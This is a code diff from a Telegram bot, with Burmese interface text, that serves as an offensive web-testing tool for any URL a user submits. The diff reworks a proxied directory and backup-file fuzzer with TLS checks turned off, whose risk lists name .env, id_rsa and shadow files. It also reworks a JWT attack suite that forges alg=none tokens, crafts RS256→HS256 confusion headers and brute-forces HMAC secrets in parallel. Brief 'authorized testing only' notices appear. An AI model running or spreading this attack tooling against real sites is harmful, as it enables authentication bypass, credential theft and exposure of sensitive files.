-            "  • Debug endpoints & info disclosure\n"
-            "  • Framework internals (Actuator, GraphQL...)\n"
-            "  • Log files & source leaks\n\n"
-            "🔬 *Param mode detects:*\n"
-            "  • Active query parameters\n"
-            "  • Open redirect parameters\n"
-            "  • Debug/admin param flags\n\n"
-            "✅ Baseline fingerprinting to eliminate false positives\n"
-            "⚠️ _Authorized testing only._",
-            parse_mode='Markdown'
-        )
-        return
-
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
-        return
-
-    url = context.args[0].strip()
-    if not url.startswith('http'):
-        url = 'https://' + url
-    mode = context.args[1].lower() if len(context.args) > 1 and context.args[1].lower() in ('paths','params') else 'paths'
-
-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
-        return
-
-    domain   = urlparse(url).hostname
-    # Full URL path preserved — do not strip to root
-    _pu = urlparse(url)
-    _dir = _pu.path.rsplit("/", 1)[0].rstrip("/") + "/" if "/" in _pu.path else "/"
-    base_url = f"{_pu.scheme}://{_pu.netloc}{_dir}"
-    wordlist = _FUZZ_PATHS if mode == 'paths' else _FUZZ_PARAMS
-
-    msg = await update.effective_message.reply_text(
-        f"🧪 *Fuzzing `{domain}`* [{mode}]\n"
-        f"Wordlist: `{len(wordlist)}` entries\n"
-        "Baseline fingerprinting active...\n⏳",
-        parse_mode='Markdown'
-    )
-
-    progress_q = []
-
-    async def _prog():
-        while True:
-            await asyncio.sleep(3)
-            if progress_q:
-                txt = progress_q[-1]; progress_q.clear()
-                try:
-                    await msg.edit_text(
-                        f"🧪 *Fuzzing `{domain}`* [{mode}]\n\n{txt}", parse_mode='Markdown')
-                except Exception:
-                    pass
-
-    prog = asyncio.create_task(_prog())
-    try:
-        found, baseline_st = await asyncio.to_thread(
-            _fuzz_sync, base_url if mode == 'paths' else url, mode, progress_q
-        )
-    except Exception as e:
-        prog.cancel()
-        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
-        return
-    finally:
-        prog.cancel()
-
-    st_icons = {
-        200:"✅", 201:"✅", 204:"✅",
-        301:"↪️", 302:"↩️", 307:"🔄",
-        401:"🔑", 403:"🔒", 500:"💥"
-    }
-    risk_words = {
-        "paths": ['backup','.env','admin','config','debug','.sql','.bak',
-                   'password','secret','credential','id_rsa','passwd','shadow',
-                   'actuator','phpinfo','phpmyadmin','adminer'],
-        "params": ['cmd','exec','command','file','path','url','redirect',
-                   'include','require','load','src'],
-    }
-
-    lines = [
-        f"🧪 *Fuzz Results — `{domain}`* [{mode}]",
-        f"Baseline: `{baseline_st}` | Found: `{len(found)}` interesting\n",
-    ]
-
-    if not found:
-        lines.append("🔒 Nothing found — well hardened!")
-    else:
-        # Categorize
-        critical = [r for r in found if r["status"] == 200 and
-                    any(w in r["url"].lower() for w in risk_words.get(mode, []))]
-        normal   = [r for r in found if r not in critical]
-
-        if critical:
-            lines.append(f"*🔴 High-Risk ({len(critical)}):*")
-            for item in critical[:10]:
-                icon = st_icons.get(item["status"], f"⚙️")
-                path = item["url"].replace(base_url, "")
-                lines.append(
-                    f"  {icon} `{item['status']}` `{path[:60]}` _{item['size']}b_"
-                )
-            lines.append("")
-
-        if normal:
-            lines.append(f"*🟡 Interesting ({len(normal)}):*")
-            for item in normal[:20]:
-                icon = st_icons.get(item["status"], f"⚙️")
-                path = item["url"].replace(base_url, "")
-                lines.append(
-                    f"  {icon} `{item['status']}` `{path[:60]}` _{item['size']}b_"
-                )
-            if len(normal) > 20:
-                lines.append(f"  _…{len(normal)-20} more in report_")
-
-    lines.append("\n⚠️ _Passive fuzzing. No exploitation._")
-
-    # ── Always export JSON report ──────────────────
-    import io as _io
-    report = json.dumps({
-        "target": url, "mode": mode, "domain": domain,
-        "scanned_at": datetime.now().isoformat(),
-        "baseline_status": baseline_st,
-        "wordlist_size": len(wordlist),
-        "findings_count": len(found),
-        "findings": [{
-            "url":    r["url"],
-            "path":   r["url"].replace(base_url,""),
-            "status": r["status"],
-            "size":   r["size"],
-            "content_type": r["ct"],
-            "high_risk": any(w in r["url"].lower() for w in risk_words.get(mode,[])),
-        } for r in found],
-    }, indent=2)
-
-    tg_text = "\n".join(lines)
-    try:
-        await msg.edit_text(tg_text[:4000], parse_mode='Markdown')
-    except Exception:
-        pass
-
-    buf = _io.BytesIO(report.encode())
-    ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
-    safe_d = re.sub(r'[^\w\-]', '_', domain)
-    await context.bot.send_document(
-        chat_id=update.effective_chat.id,
-        document=buf,
-        filename=f"fuzz_{mode}_{safe_d}_{ts}.json",
-        caption=(
-            f"🧪 *Fuzz Report — `{domain}`* [{mode}]\n"
-            f"Found: `{len(found)}` | Baseline: `{baseline_st}`\n"
-            f"Wordlist: `{len(wordlist)}` entries"
-        ),
-        parse_mode='Markdown'
-    )
-
-
-# ══════════════════════════════════════════════════
-# 📢  FEATURE 8 — Force Join Channel (Must-Sub)
-# ══════════════════════════════════════════════════
-# DB structure: db["settings"]["force_channels"] = ["@channelusername", ...]
-# Admin IDs always bypass — no check needed.
-
-async def _get_force_channels(db: dict) -> list:
-    return db.get("settings", {}).get("force_channels", [])
-
-async def check_force_join(update: Update, context) -> bool:
-    """
-    Returns True if user is allowed to proceed.
-    Admin always passes. Regular users must be member of all force channels.
-    """
-    uid = update.effective_user.id
-    if uid in ADMIN_IDS:
-        return True  # Admin — always free
-
-    async with db_lock:
-        db = _load_db_sync()
-    channels = await _get_force_channels(db)
-    if not channels:
-        return True  # No force join configured — allow all
-
-    not_joined = []
-    for ch in channels:
-        try:
-            member = await context.bot.get_chat_member(chat_id=ch, user_id=uid)
-            if member.status in ("left", "kicked", "banned"):
-                not_joined.append(ch)
-        except Exception:
-            not_joined.append(ch)
-
-    if not not_joined:
-        return True
-
-    # Build join buttons
-    kb = []
-    for ch in not_joined:
-        label = ch if ch.startswith('@') else f"Channel"
-        invite_link = ch if ch.startswith('@') else ch
-        kb.append([InlineKeyboardButton(f"📢 {label} ကို Join လုပ်ပါ", url=f"https://t.me/{invite_link.lstrip('@')}")])
-    kb.append([InlineKeyboardButton("✅ Join ပြီး — စစ်ဆေးပါ", callback_data="fj_check")])
-
-    await update.effective_message.reply_text(
-        "🔒 *Bot ကို သုံးရန် Channel Join လုပ်ရပါမည်*\n\n"
-        "အောက်ပါ Channel(s) ကို Join ပြီးမှ ဆက်လုပ်ပါ:\n\n"
-        + "\n".join(f"  • {ch}" for ch in not_joined),
-        reply_markup=InlineKeyboardMarkup(kb),
-        parse_mode='Markdown'
-    )
-    return False
-
-
-async def force_join_callback(update: Update, context) -> None:
-    """Callback for '✅ Join ပြီး — စစ်ဆေးပါ' button"""
-    query = update.callback_query
-    await query.answer()
-    uid = query.from_user.id
-
-    async with db_lock:
-        db = _load_db_sync()
-    channels = await _get_force_channels(db)
-
-    not_joined = []
-    for ch in channels:
-        try:
-            member = await context.bot.get_chat_member(chat_id=ch, user_id=uid)
-            if member.status in ("left", "kicked", "banned"):
-                not_joined.append(ch)
-        except Exception:
-            not_joined.append(ch)
-
-    if not not_joined:
-        try:
-            await query.edit_message_text(
-                "✅ *စစ်ဆေးမှု အောင်မြင်ပါပြီ!*\n\n"
-                "Bot ကို အခုသုံးလို့ ရပါပြီ 🎉\n"
-                "/start ကို နှိပ်ပါ",
-                parse_mode='Markdown'
-            )
-        except BadRequest:
-            pass  # Message already same content — ignore
-    else:
-        kb = []
-        for ch in not_joined:
-            kb.append([InlineKeyboardButton(
-                f"📢 {ch} ကို Join လုပ်ပါ",
-                url=f"https://t.me/{ch.lstrip('@')}"
-            )])
-        kb.append([InlineKeyboardButton("✅ Join ပြီး — စစ်ဆေးပါ", callback_data="fj_check")])
-        new_text = (
-            "❌ *မပြည့်စုံသေးပါ*\n\n"
-            "အောက်ပါ channel(s) ကို မဖြစ်မနေ Join ပါ:\n\n"
-            + "\n".join(f"  • {ch}" for ch in not_joined)
-        )
-        try:
-            await query.edit_message_text(
-                new_text,
-                reply_markup=InlineKeyboardMarkup(kb),
-                parse_mode='Markdown'
-            )
-        except BadRequest:
-            # Message not modified (same channels) — just answer silently
-            await query.answer("မပြည့်စုံသေးပါ — Channel Join ပြီးမှ ထပ်နှိပ်ပါ", show_alert=True)
-
-
-async def appassets_cat_callback(update: Update, context) -> None:
-    """Callback for /appassets category selection buttons."""
-    query = update.callback_query
-    await query.answer()
-    uid  = query.from_user.id
-    data = query.data  # apa_images / apa_all / etc.
-
-    cat = data[4:]  # strip "apa_"
-    valid_cats = set(_ASSET_CATEGORIES.keys())
-
-    if cat == "all":
-        wanted_cats = valid_cats.copy()
-    elif cat in valid_cats:
-        wanted_cats = {cat}
-    else:
-        try: await query.edit_message_text("❌ Unknown category")
-        except BadRequest: pass
-        return
-
-    async with db_lock:
-        db = _load_db_sync()
-    u = get_user(db, uid)
-    last_app = u.get("last_uploaded_app")
-
-    if not last_app or not os.path.exists(last_app):
-        try:
-            await query.edit_message_text(
-                "⚠️ ဖိုင် မတွေ့တော့ပါ — APK/IPA/ZIP ကို ထပ် upload ပါ"
-            )
-        except BadRequest: pass
-        return
-
-    try:
-        await query.edit_message_text(
-            f"📦 Extracting `{', '.join(sorted(wanted_cats))}` from "
-            f"`{os.path.basename(last_app)}`...\n⏳"
-        )
-    except BadRequest:
-        pass
-
-    # Use query.message as message target — send new reply
-    await _do_appassets_extract(query.message, context, last_app, wanted_cats)
-
-
-@admin_only
-async def cmd_setforcejoin(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/setforcejoin @channel1 @channel2 ... | /setforcejoin off"""
-    if not context.args:
-        async with db_lock:
-            db = _load_db_sync()
-        chs = await _get_force_channels(db)
-        await update.effective_message.reply_text(
-            "📢 *Force Join Settings*\n\n"
-            f"လက်ရှိ channels: `{'None' if not chs else ', '.join(chs)}`\n\n"
-            "Usage:\n"
-            "`/setforcejoin @mychannel` — Channel တစ်ခု set\n"
-            "`/setforcejoin @ch1 @ch2` — Channel နှစ်ခု\n"
-            "`/setforcejoin off` — ပိတ်မည်\n\n"
-            "⚠️ Bot ကို Channel admin ထဲ ထည့်ထားဖို့ မမေ့ပါနဲ့",
-            parse_mode='Markdown'
-        )
-        return
-
-    async with db_lock:
-        db = _load_db_sync()
-        if context.args[0].lower() == "off":
-            db["settings"]["force_channels"] = []
-            _save_db_sync(db)
-            await update.effective_message.reply_text("✅ Force Join ပိတ်လိုက်ပါပြီ")
-            return
-        channels = [a if a.startswith('@') else '@' + a for a in context.args]
-        db["settings"]["force_channels"] = channels
-        _save_db_sync(db)
-
-    await update.effective_message.reply_text(
-        f"✅ *Force Join set လုပ်ပြီး*\n\n"
-        f"Channels: {', '.join(f'`{c}`' for c in channels)}\n\n"
-        "Users တွေ join မလုပ်ရင် Bot သုံးခွင့် မရတော့ပါ\n"
-        "⚠️ Bot ကို အဆိုပါ channel(s) မှာ admin အဖြစ် ထည့်ထားဖို့ မမေ့နဲ့",
-        parse_mode='Markdown'
-    )
-
-
-# ══════════════════════════════════════════════════
-# 📦  FEATURE 9 — Advanced APK Asset Extractor (/appassets)
-# ══════════════════════════════════════════════════
 
 _ASSET_CATEGORIES = {
     "images":   {'.png','.jpg','.jpeg','.gif','.webp','.svg','.bmp','.ico','.avif'},
@@ -14772,50 +14637,76 @@ def _build_context_wordlist(url: str, progress_cb=None) -> tuple:
 
 
 def _smartfuzz_probe_sync(base_url: str, wordlist: list, progress_cb=None) -> list:
-    """Probe all wordlist entries against target."""
+    """Probe wordlist + backup ext variants + response diff."""
     found = []
 
-    # Baseline fingerprint
     try:
         r404 = requests.get(
-            base_url.rstrip('/') + '/xyznotfound_abc123_never_exists',
-            proxies=proxy_manager.get_proxy(), timeout=6, verify=False, headers=_get_headers()
+            base_url.rstrip("/") + "/xyznotfound_abc123_never_exists",
+            proxies=proxy_manager.get_proxy(),
+            timeout=6, verify=False, headers=_get_headers()
         )
         baseline_status = r404.status_code
         baseline_hash   = hashlib.md5(r404.content[:512]).hexdigest()
         baseline_size   = len(r404.content)
+        baseline_words  = len(r404.text.split()) if r404.text else 0
     except Exception:
-        baseline_status, baseline_hash, baseline_size = 404, '', 0
+        baseline_status, baseline_hash, baseline_size, baseline_words = 404, "", 0, 0
+
+    # Expand wordlist with backup extensions
+    expanded = list(wordlist)
+    for word in wordlist[:50]:
+        for ext in [".bak", ".old", ".swp", "~", ".orig"]:
+            expanded.append(word.rstrip("/") + ext)
 
     def _probe(word):
-        target = base_url.rstrip('/') + '/' + word.lstrip('/')
+        target = base_url.rstrip("/") + "/" + word.lstrip("/")
         try:
-            r = requests.get(target, timeout=5, verify=False, headers=_get_headers(),
-                             proxies=proxy_manager.get_proxy(), allow_redirects=True, stream=True)
-            chunk = b''
-            for part in r.iter_content(512):
+            r = requests.get(
+                target, timeout=5, verify=False,
+                headers=_get_headers(), proxies=proxy_manager.get_proxy(),
+                allow_redirects=True, stream=True
+            )
+            chunk = b""
+            for part in r.iter_content(1024):
                 chunk += part
-                if len(chunk) >= 512: break
+                if len(chunk) >= 1024:
+                    break
             r.close()
-            r_hash = hashlib.md5(chunk[:512]).hexdigest()
-            r_size = len(chunk)
-            # Filter baseline catch-all
+            r_hash  = hashlib.md5(chunk[:512]).hexdigest()
+            r_size  = len(chunk)
+            r_words = len(chunk.decode("utf-8", "ignore").split())
+
             if r.status_code == baseline_status:
-                if r_hash == baseline_hash: return None
-                if baseline_size > 0 and abs(r_size - baseline_size) < 30: return None
+                if r_hash == baseline_hash:
+                    return None
+                if baseline_size > 0 and abs(r_size - baseline_size) < 30:
+                    return None
+                if baseline_words > 0 and abs(r_words - baseline_words) < 5:
+                    return None
+
             if r.status_code in (200, 201, 301, 302, 401, 403, 500):
-                return {"url": target, "word": word, "status": r.status_code, "size": r_size}
+                return {
+                    "url":    target,
+                    "word":   word,
+                    "status": r.status_code,
+                    "size":   r_size,
+                    "gated":  r.status_code in (401, 403),
+                }
         except Exception:
             pass
         return None
 
     done = 0
     with concurrent.futures.ThreadPoolExecutor(max_workers=15) as ex:
-        fmap = {ex.submit(_probe, w): w for w in wordlist}
-        for fut in concurrent.futures.as_completed(fmap, timeout=120):
+        fmap = {ex.submit(_probe, w): w for w in expanded}
+        for fut in concurrent.futures.as_completed(fmap, timeout=150):
             done += 1
-            if progress_cb and done % 30 == 0:
-                progress_cb(f"🧪 Fuzzing: `{done}/{len(wordlist)}` | Found: `{len(found)}`")
+            if progress_cb and done % 40 == 0:
+                progress_cb(
+                    f"🧪 Fuzzing: `{done}/{len(expanded)}` | "
+                    f"Found: `{len(found)}` (incl. gated)"
+                )
             try:
                 res = fut.result(timeout=6)
                 if res:
@@ -14823,190 +14714,19 @@ def _smartfuzz_probe_sync(base_url: str, wordlist: list, progress_cb=None) -> li
             except Exception:
                 pass
 
-    found.sort(key=lambda x: (x['status'] != 200, x['status']))
+    found.sort(key=lambda x: (x["status"] != 200, not x.get("gated"), x["status"]))
     return found
 
 
-async def cmd_smartfuzz(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/smartfuzz <url> — Context-aware wordlist builder + fuzzer"""
-    if not await check_force_join(update, context):
-        return
-
-    if not context.args:
-        await update.effective_message.reply_text(
-            "📌 *Usage:* `/smartfuzz https://example.com`\n\n"
-            "🗂️ *Smart Fuzzer — 3 Phases:*\n\n"
-            "① *Context Harvesting* — Target ကို scrape ပြီး\n"
-            "   Company name, product name, developer identifiers,\n"
-            "   JS variables, class/ID names, meta keywords\n"
-            "   တွေကို ဆုပ်ကိုင်ပါမည်\n\n"
-            "② *Wordlist Generation* (CeWL-style)\n"
-            "   ရလာတဲ့ words တွေကို backup/year/suffix combos\n"
-            "   နဲ့ permutate လုပ်ပြီး custom dictionary ဆောက်ပါမည်\n"
-            "   Example: `companyname_backup_2025.zip`\n\n"
-            "③ *Smart Fuzzing*\n"
-            "   Custom wordlist ဖြင့် target ကို probe လုပ်ပြီး\n"
-            "   Baseline fingerprinting ဖြင့် false-positive စစ်ပါမည်\n\n"
-            "📦 Wordlist + Results ကို export ပေးမည်\n"
-            "⚠️ _Authorized testing only_",
-            parse_mode='Markdown'
-        )
-        return
-
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
-        return
-
-    url = context.args[0].strip()
-    if not url.startswith('http'):
-        url = 'https://' + url
-
-    safe_ok, reason = is_safe_url(url)
-    if not safe_ok:
-        await update.effective_message.reply_text(f"🚫 `{reason}`", parse_mode='Markdown')
-        return
-
-    domain = urlparse(url).netloc
-    # Full URL path preserved — do not strip to root
-    _pu = urlparse(url)
-    _dir = _pu.path.rsplit("/", 1)[0].rstrip("/") + "/" if "/" in _pu.path else "/"
-    base_url = f"{_pu.scheme}://{_pu.netloc}{_dir}"
-    msg = await update.effective_message.reply_text(
-        f"🗂️ *Smart Fuzzer — `{domain}`*\n\n"
-        "① Harvesting words from target...\n"
-        "② Building custom wordlist...\n"
-        "③ Fuzzing...\n\n⏳",
-        parse_mode='Markdown'
-    )
-
-    progress_q = []
-
-    async def _prog():
-        while True:
-            await asyncio.sleep(3)
-            if progress_q:
-                txt = progress_q[-1]; progress_q.clear()
-                try:
-                    await msg.edit_text(
-                        f"🗂️ *SmartFuzz — `{domain}`*\n\n{txt}", parse_mode='Markdown')
-                except Exception:
-                    pass
-
-    prog = asyncio.create_task(_prog())
-    try:
-        wordlist, raw_words = await asyncio.to_thread(
-            _build_context_wordlist, url, lambda t: progress_q.append(t)
-        )
-        if not wordlist:
-            prog.cancel()
-            await msg.edit_text("❌ Words ဆွဲထုတ်မရပါ — site ကို access လုပ်မရနိုင်ပါ", parse_mode='Markdown')
-            return
-
-        progress_q.append(f"✅ Wordlist: `{len(wordlist)}` words\n🧪 Fuzzing နေပါသည်...")
-        found = await asyncio.to_thread(
-            _smartfuzz_probe_sync, base_url, wordlist,
-            lambda t: progress_q.append(t)
-        )
-    except Exception as e:
-        prog.cancel()
-        await msg.edit_text(f"❌ Error: `{e}`", parse_mode='Markdown')
-        return
-    finally:
-        prog.cancel()
-
-    # ── Summary ───────────────────────────────────
-    hits_200   = [f for f in found if f['status'] == 200]
-    hits_auth  = [f for f in found if f['status'] in (401, 403)]
-    hits_redir = [f for f in found if f['status'] in (301, 302)]
-    hits_err   = [f for f in found if f['status'] == 500]
-
-    lines = [
-        f"🗂️ *SmartFuzz Results — `{domain}`*",
-        f"━━━━━━━━━━━━━━━━━━━━",
-        f"📝 Words scraped: `{len(raw_words)}`",
-        f"🎯 Wordlist generated: `{len(wordlist)}`",
-        f"🔍 Total probed: `{len(wordlist)}`",
-        f"✅ Found: `{len(found)}` interesting",
-        "",
-    ]
-
-    if hits_200:
-        lines.append(f"*✅ HTTP 200 — Accessible ({len(hits_200)}):*")
-        for h in hits_200[:15]:
-            lines.append(f"  🟢 `/{h['word']}` → `{h['size']}B`")
-        lines.append("")
-
-    if hits_auth:
-        lines.append(f"*🔒 Protected 401/403 ({len(hits_auth)}):*")
-        for h in hits_auth[:10]:
-            lines.append(f"  🔐 `/{h['word']}` [{h['status']}]")
-        lines.append("")
-
-    if hits_redir:
-        lines.append(f"*↩️ Redirects ({len(hits_redir)}):*")
-        for h in hits_redir[:5]:
-            lines.append(f"  ↪ `/{h['word']}` [{h['status']}]")
-        lines.append("")
-
-    if hits_err:
-        lines.append(f"*⚠️ Server Errors 500 ({len(hits_err)}):*")
-        for h in hits_err[:5]:
-            lines.append(f"  🔴 `/{h['word']}`")
-        lines.append("")
-
-    if not found:
-        lines.append("📭 _Interesting paths မတွေ့ပါ_")
-
-    lines.append("⚠️ _Authorized testing only_")
-
-    report = "\n".join(lines)
-    try:
-        if len(report) <= 4000:
-            await msg.edit_text(report, parse_mode='Markdown')
-        else:
-            await msg.edit_text(report[:4000], parse_mode='Markdown')
-    except Exception:
-        await update.effective_message.reply_text(report[:4000], parse_mode='Markdown')
-
-    # ── Export wordlist + results as ZIP ─────────
-    import io, zipfile as _zf
-    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
-    safe_d = re.sub(r'[^\w\-]', '_', domain)
-    zip_buf = io.BytesIO()
-
-    with _zf.ZipFile(zip_buf, 'w', _zf.ZIP_DEFLATED) as zf:
-        zf.writestr("wordlist.txt", "\n".join(wordlist))
-        zf.writestr("raw_words.txt", "\n".join(sorted(raw_words)))
-        result_lines = [f"{f['status']}\t{f['url']}\t{f['size']}B" for f in found]
-        zf.writestr("results.txt", "\n".join(result_lines) or "No results")
-        zf.writestr("results.json", json.dumps({
-            "domain": domain, "scanned_at": datetime.now().isoformat(),
-            "wordlist_size": len(wordlist), "raw_words": len(raw_words),
-            "found": found
-        }, indent=2))
-
-    zip_buf.seek(0)
-    try:
-        await context.bot.send_document(
-            chat_id=update.effective_chat.id,
-            document=zip_buf,
-            filename=f"smartfuzz_{safe_d}_{ts}.zip",
-            caption=(
-                f"🗂️ *SmartFuzz Export — `{domain}`*\n"
-                f"📝 Wordlist: `{len(wordlist)}` | Found: `{len(found)}`\n"
-                "Files: `wordlist.txt` + `raw_words.txt` + `results.json`"
-            ),
-            parse_mode='Markdown'
-        )
-    except Exception as e:
-        logger.warning("SmartFuzz export error: %s", e)
-
-
-# ══════════════════════════════════════════════════
-# 🎟️  FEATURE 12 — Advanced JWT Attacker & Cracker (/jwtattack)
-# ══════════════════════════════════════════════════
+# ───────────────────────────────────────────────────────────────────
+# [4] REPLACE _endpoints_sync (original: line ~8865)
+#     IMPROVEMENTS:
+#       + Fetch /swagger.json /openapi.yaml /api-docs /redoc
+#       + GraphQL introspection query (types list)
+#       + Parse Next.js _buildManifest.js for route list
+#       + gRPC-web content-type detection
+#       + Group /v1 /v2 /v3 side-by-side in results
+# ───────────────────────────────────────────────────────────────────
 
 import base64 as _b64
 
@@ -15041,59 +14761,67 @@ def _jwt_decode_payload(token: str) -> dict:
 
 
 def _jwt_none_attack(token: str) -> dict:
-    """None algorithm bypass — forge unsigned token."""
-    parts = token.split('.')
+    """None algorithm bypass — also try 'NONE', 'None' variants."""
+    parts = token.split(".")
     if len(parts) != 3:
         return {"success": False}
     try:
-        header_dec = _jwt_decode_payload(token)["header"]
-        orig_alg   = header_dec.get("alg", "HS256")
-        forged_header = dict(header_dec)
-        forged_header["alg"] = "none"
-        def _b64e(d: dict) -> str:
-            return _b64.b64encode(json.dumps(d, separators=(',',':')).encode()).decode().rstrip('=').replace('+','-').replace('/','_')
-        forged = f"{_b64e(forged_header)}.{parts[1]}."
+        dec = _jwt_decode_payload(token)
+        if "error" in dec:
+            return {"success": False, "error": dec["error"]}
+        orig_alg = dec["header"].get("alg", "HS256")
+
+        variants = []
+        for alg_val in ("none", "None", "NONE", "nOnE"):
+            h = {**dec["header"], "alg": alg_val}
+            variants.append(f"{_b64url_encode(h)}.{parts[1]}.")
+
         return {
-            "success": True,
+            "success":      True,
             "original_alg": orig_alg,
-            "forged_token":  forged,
-            "method": "none_alg_bypass",
-            "note": "Signature removed — send with empty sig. Some servers accept this."
+            "forged_tokens": variants,
+            "method":       "none_alg_bypass",
+            "note":         "Try all 4 case variants — some servers check case-insensitively.",
         }
     except Exception as e:
         return {"success": False, "error": str(e)}
 
 
 def _jwt_alg_confusion(token: str) -> dict:
-    """Algorithm confusion — RS256→HS256 concept (no public key needed for demo)."""
-    parts = token.split('.')
+    """RS256 → HS256 algorithm confusion attack."""
+    parts = token.split(".")
     if len(parts) != 3:
         return {"success": False}
     try:
-        header_dec = _jwt_decode_payload(token)["header"]
-        orig_alg   = header_dec.get("alg", "HS256")
-        if orig_alg == "RS256":
-            confused = dict(header_dec)
-            confused["alg"] = "HS256"
-            def _b64e(d: dict) -> str:
-                return _b64.b64encode(json.dumps(d, separators=(',',':')).encode()).decode().rstrip('=').replace('+','-').replace('/','_')
-            confused_header = _b64e(confused)
-            note = (
-                "RS256→HS256 confusion: Change alg to HS256 then sign with public key as secret.\n"
-                "Tool: python-jwt or jwt_tool.py\n"
-                "CMD: python3 jwt_tool.py -X k -pk pubkey.pem <token>"
-            )
-            return {"success": True, "original_alg": "RS256", "target_alg": "HS256",
-                    "confused_header": confused_header, "method": "alg_confusion", "note": note}
-        return {"success": False, "note": f"Alg is `{orig_alg}` (RS256 only for this attack)"}
+        dec = _jwt_decode_payload(token)
+        if "error" in dec:
+            return {"success": False}
+        orig_alg = dec["header"].get("alg", "HS256")
+        if orig_alg in ("RS256", "RS384", "RS512", "ES256", "ES384"):
+            confused = {**dec["header"], "alg": "HS256"}
+            return {
+                "success":         True,
+                "original_alg":    orig_alg,
+                "target_alg":      "HS256",
+                "confused_header": _b64url_encode(confused),
+                "method":          "alg_confusion",
+                "note": (
+                    f"{orig_alg}→HS256 confusion: Change alg to HS256 then sign with "
+                    "the server's public key as the HMAC secret.\n"
+                    "Tool: jwt_tool.py\n"
+                    "CMD: python3 jwt_tool.py -X k -pk pubkey.pem <token>"
+                ),
+            }
+        return {"success": False, "note": f"Alg is `{orig_alg}` (RS/ES256 needed)"}
     except Exception as e:
         return {"success": False, "error": str(e)}
 
 
 def _jwt_brute_force(token: str, wordlist: list = None, progress_cb=None) -> dict:
-    """Brute-force JWT HMAC secret from wordlist."""
+    """Parallel HMAC brute-force — significantly faster than sequential."""
     import hmac as _hmac
-    parts = token.split('.')
+
+    parts = token.split(".")
     if len(parts) != 3:
         return {"cracked": False, "error": "Invalid JWT"}
 
@@ -15102,1157 +14830,70 @@ def _jwt_brute_force(token: str, wordlist: list = None, progress_cb=None) -> dic
         "HS384": hashlib.sha384,
         "HS512": hashlib.sha512,
     }
-
-    # Detect algorithm
     header_info = _jwt_decode_payload(token).get("header", {})
     alg = header_info.get("alg", "HS256")
     if alg not in target_algs:
-        return {"cracked": False, "error": f"Algorithm `{alg}` not brute-forceable (needs HMAC)"}
+        return {"cracked": False, "error": f"Algorithm `{alg}` not HMAC-brute-forceable"}
 
     hash_fn   = target_algs[alg]
     msg_bytes = f"{parts[0]}.{parts[1]}".encode()
-
-    # Decode target signature
-    sig_pad = parts[2].replace('-', '+').replace('_', '/')
-    sig_pad += '=' * (-len(sig_pad) % 4)
+    sig_pad   = parts[2].replace("-", "+").replace("_", "/")
+    sig_pad  += "=" * (-len(sig_pad) % 4)
     try:
         target_sig = _b64.b64decode(sig_pad)
     except Exception:
         return {"cracked": False, "error": "Cannot decode signature"}
 
-    wl = wordlist or _JWT_COMMON_SECRETS
+    wl    = wordlist or _JWT_COMMON_SECRETS
     total = len(wl)
+    found = [None]  # shared result
 
-    for i, secret in enumerate(wl):
-        if progress_cb and i % 50 == 0:
-            progress_cb(f"🔑 Brute-force: `{i}/{total}` tried")
-        try:
-            computed = _hmac.HMAC(secret.encode(), msg_bytes, hash_fn).digest()
-            if computed == target_sig:
-                return {"cracked": True, "secret": secret, "alg": alg, "tried": i + 1}
-        except Exception:
-            continue
+    def _try_batch(secrets):
+        for secret in secrets:
+            if found[0]:
+                return
+            try:
+                computed = _hmac.new(secret.encode(), msg_bytes, hash_fn).digest()
+                if computed == target_sig:
+                    found[0] = secret
+                    return
+            except Exception:
+                pass
 
+    # Split into batches for parallel workers
+    batch_size = max(1, total // 8)
+    batches    = [wl[i:i + batch_size] for i in range(0, total, batch_size)]
+    done_count = [0]
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
+        futures = [ex.submit(_try_batch, b) for b in batches]
+        for fut in concurrent.futures.as_completed(futures):
+            done_count[0] += 1
+            if progress_cb:
+                tried = min(done_count[0] * batch_size, total)
+                progress_cb(f"🔑 Brute-force: `{tried}/{total}` | Workers: 8")
+            if found[0]:
+                for f in futures:
+                    f.cancel()
+                break
+
+    if found[0]:
+        return {"cracked": True, "secret": found[0], "alg": alg,
+                "tried": wl.index(found[0]) + 1}
     return {"cracked": False, "tried": total, "alg": alg}
 
 
-async def cmd_jwtattack(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """/jwtattack <token> — Decode, attack, and crack JWT tokens"""
-    if not await check_force_join(update, context):
-        return
+# ───────────────────────────────────────────────────────────────────
+# [3] REPLACE _fuzz_sync + _smartfuzz_probe_sync + _build_context_wordlist
+#     (original: lines ~4252 / 5108 / 5231)
+#     IMPROVEMENTS:
+#       + Tech-aware wordlist selection (_detect_tech_stack)
+#       + Backup extension scan (.bak .old .orig .swp ~)
+#       + Parameter fuzzing with debug/injection values
+#       + Response body diff fingerprinting (not just size/hash)
+#       + 401/403 → "gated" flag distinct from "exposed"
+# ───────────────────────────────────────────────────────────────────
 
-    if not context.args:
-        await update.effective_message.reply_text(
-            "📌 *Usage:* `/jwtattack <token>`\n\n"
-            "🎟️ *JWT Attack Phases:*\n\n"
-            "① *Decode* — Header + Payload reveal\n"
-            "   Algorithm, expiry, user roles, claims\n\n"
-            "② *None Algorithm Bypass*\n"
-            "   `alg: none` — unsigned token forge\n\n"
-            "③ *Algorithm Confusion*\n"
-            "   RS256 → HS256 confusion attack\n\n"
-            "④ *Secret Key Brute-force*\n"
-            f"   `{len(_JWT_COMMON_SECRETS)}` common secrets + dictionary\n\n"
-            "💡 `/extract <url>` နဲ့ token ရှာပြီး ဒီမှာ paste ပါ",
-            parse_mode='Markdown'
-        )
-        return
-
-    uid = update.effective_user.id
-    allowed, wait = check_rate_limit(uid)
-    if not allowed:
-        await update.effective_message.reply_text(f"⏳ `{wait}s` စောင့်ပါ", parse_mode='Markdown')
-        return
-
-    token = context.args[0].strip()
-
-    # URL pass လုပ်မိရင် ကောင်းကောင်း error ပြ
-    if token.startswith('http://') or token.startswith('https://'):
